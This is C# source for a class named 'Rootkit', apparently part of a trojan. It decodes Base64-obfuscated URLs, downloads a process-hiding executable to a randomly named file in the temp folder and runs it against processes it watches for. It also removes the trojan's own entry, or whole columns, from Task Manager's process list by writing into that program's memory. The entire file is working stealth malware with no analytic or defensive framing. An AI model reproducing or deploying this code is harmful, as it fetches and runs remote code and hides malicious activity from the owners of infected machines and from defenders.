using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Complex;

internal class Rootkit
{
	private struct LVITEM
	{
		public uint mask;

		public IntPtr iItem;

		public IntPtr iSubItem;

		public uint state;

		public uint stateMask;

		public IntPtr pszText;

		public uint cchTextMax;

		public int iImage;

		public IntPtr lParam;
	}

	private const int PROCESS_VM_OPERATION = 8;

	private const int PROCESS_VM_READ = 16;

	private const int PROCESS_VM_WRITE = 32;

	private const int PROCESS_ALL_ACCESS = 0;

	private const int MEM_COMMIT = 4096;

	private const int MEM_RESERVE = 8192;

	private const int MEM_DECOMMIT = 16384;

	private const int MEM_RELEASE = 32768;

	private const int MEM_FREE = 65536;

	private const int MEM_PRIVATE = 131072;

	private const int MEM_MAPPED = 262144;

	private const int MEM_TOP_DOWN = 1048576;

	private const int PAGE_NOACCESS = 1;

	private const int PAGE_READONLY = 2;

	private const int PAGE_READWRITE = 4;

	private const int PAGE_WRITECOPY = 8;

	private const int PAGE_EXECUTE = 16;

	private const int PAGE_EXECUTE_READ = 32;

	private const int PAGE_EXECUTE_READWRITE = 64;

	private const int PAGE_EXECUTE_WRITECOPY = 128;

	private const int PAGE_GUARD = 256;

	private const int PAGE_NOCACHE = 512;

	private const int LVM_FIRST = 4096;

	private const int LVM_GETITEMCOUNT = 4100;

	private const int LVM_DELETEITEM = 4104;

	private const int LVM_GETITEMTEXTA = 4141;

	private const int LVM_SETITEMTEXTA = 4142;

	private const int LVM_DELETECOLUMN = 4124;

	private static volatile bool endWorker = false;

	public static volatile bool hideOnlyTrojan = true;

	public static string DownloadTool()
	{
		if (IntPtr.Size == 8)
		{
			Program.toolLocation = DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			Program.toolLocation = DownloadFile(new Uri(Program.Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return Program.toolLocation;
	}

	public static string DownloadFile(Uri Url)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Url, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process IsProcessOpen(string name)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(name))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void WaitForProcess(string[] processesToCheck)
	{
		string text = DownloadTool();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string name in processesToCheck)
			{
				Process process = IsProcessOpen(name);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					Program.ProcessCommand(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					Program.ProcessCommand(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int dwFreeType);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out UIntPtr lpNumberOfBytesRead);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);

	private static byte[] StructureToByteArray(object obj)
	{
		int num = Marshal.SizeOf(obj);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(obj, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr OpenProcessHandle(uint pid)
	{
		return OpenProcess(56, bInheritHandle: false, pid);
	}

	private static void CloseProcessHandle(IntPtr hProcess)
	{
		CloseHandle(hProcess);
	}

	private static IntPtr AllocExternalMemory(uint memSize, IntPtr hProcess)
	{
		return VirtualAllocEx(hProcess, IntPtr.Zero, memSize, 12288, 4);
	}

	private static void FreeExternalMemory(IntPtr hProcess, IntPtr MemAddress, uint memSize)
	{
		VirtualFreeEx(hProcess, MemAddress, memSize, 32768);
	}

	private static IntPtr FindTaskManager()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr GetItemCount(IntPtr handle)
	{
		return SendMessage(handle, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void DeleteItem(IntPtr handle, IntPtr index)
	{
		SendMessage(handle, 4104u, index, IntPtr.Zero);
	}

	private static void DeleteColumn(IntPtr handle)
	{
		SendMessage(handle, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string GetItemText(IntPtr handle, IntPtr index)
	{
		byte[] array = new byte[50];
		LVITEM lVITEM = default(LVITEM);
		GetWindowThreadProcessId(handle, out var lpdwProcessId);
		IntPtr hProcess = OpenProcessHandle(lpdwProcessId);
		IntPtr intPtr = AllocExternalMemory((uint)Marshal.SizeOf(lVITEM), hProcess);
		IntPtr intPtr2 = AllocExternalMemory(50u, hProcess);
		lVITEM.iItem = index;
		lVITEM.iSubItem = (IntPtr)0;
		lVITEM.cchTextMax = 50u;
		lVITEM.pszText = intPtr2;
		WriteProcessMemory(hProcess, intPtr, StructureToByteArray(lVITEM), (uint)Marshal.SizeOf(lVITEM), out var lpNumberOfBytesWritten);
		SendMessage(handle, 4141u, index, intPtr);
		ReadProcessMemory(hProcess, intPtr2, array, 50, out lpNumberOfBytesWritten);
		FreeExternalMemory(hProcess, intPtr, (uint)Marshal.SizeOf(lVITEM));
		FreeExternalMemory(hProcess, intPtr2, 50u);
		CloseProcessHandle(hProcess);
		return Encoding.ASCII.GetString(array);
	}

	private static void HideProcess(string process)
	{
		IntPtr intPtr = FindTaskManager();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)GetItemCount(intPtr);
		for (int i = 0; i < num; i++)
		{
			string itemText = GetItemText(intPtr, (IntPtr)i);
			if (itemText.Contains(process))
			{
				DeleteItem(intPtr, (IntPtr)i);
			}
		}
	}

	private static void HideAllProcesses()
	{
		IntPtr intPtr = FindTaskManager();
		if (intPtr != IntPtr.Zero)
		{
			DeleteColumn(intPtr);
			DeleteColumn(intPtr);
			DeleteColumn(intPtr);
			DeleteColumn(intPtr);
			DeleteColumn(intPtr);
		}
	}

	public static void Hide()
	{
		Thread thread = new Thread(Worker);
		thread.Start();
	}

	public static void StopHiding()
	{
		endWorker = true;
	}

	private static void Worker()
	{
		while (!endWorker)
		{
			if (hideOnlyTrojan)
			{
				HideProcess(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				HideAllProcesses();
				Thread.Sleep(1000);
			}
		}
		endWorker = false;
	}
}
